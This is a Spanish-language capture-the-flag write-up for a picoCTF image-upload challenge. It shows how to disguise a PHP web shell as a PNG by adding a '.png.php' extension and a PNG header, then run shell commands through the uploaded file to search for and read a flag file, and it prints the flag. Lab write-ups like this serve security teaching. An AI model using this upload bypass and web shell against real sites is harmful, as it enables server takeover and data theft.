## Objetivo
I found a web app that can help process images: PNG images only!
## Solución
- ##### Insertaremos un archivo que presuntamente es un ".png" en el sitio. Lo que en realidad es este archivo, es un script en PHP para acceder a los archivos del servidor programado en el lenguaje anteriormente mencionado. Se cambiará la extensión del archivo a ".png.php" para mantener el script y que el sitio acepte el archivo como ".png", y con el comando "nano", le pondremos al inicio de la copia del script ".PNG".
```
┌──(kali㉿kali)-[~]
└─$ mkdir picoCTF                                   
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ cd picoCTF                                      
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF]
└─$ cp /usr/share/webshells/php/s1mpl3-b4ckd00r.php webshell.php
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF]
└─$ mv webshell.php webshell.png.php
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF]
└─$ nano webshell.png.php 
```

- ##### Una vez subido el archivo, ya se encuentra en el sitio, pero no sabemos donde.
```
File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully
```

- ##### En el sitio web, hay una dirección a la cual se suben todas las cargas/imágenes, la cual es "/uploads", carpeta en la cual se ha subido el script, por lo que, lo ejecutaremos y haremos los siguientes comandos:
```
Primer comando para encontrar todos los .txt existentes: 
http://atlas.picoctf.net:56088/uploads/webshell.png.php?cmd=find%20/%20-name%20*txt%202%3E/dev/null

Segundo comando para leer la informacion del archivo .txt:
http://atlas.picoctf.net:56088/uploads/webshell.png.php?cmd=cat%20/var/www/html/MQZWCYZWGI2WE.txt
```

- ##### Como resultado del segundo comando, obtenemos la bandera.
```
Flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
```
## Notas Adicionales
## Referencias
- [PicoCTF](https://play.picoctf.org)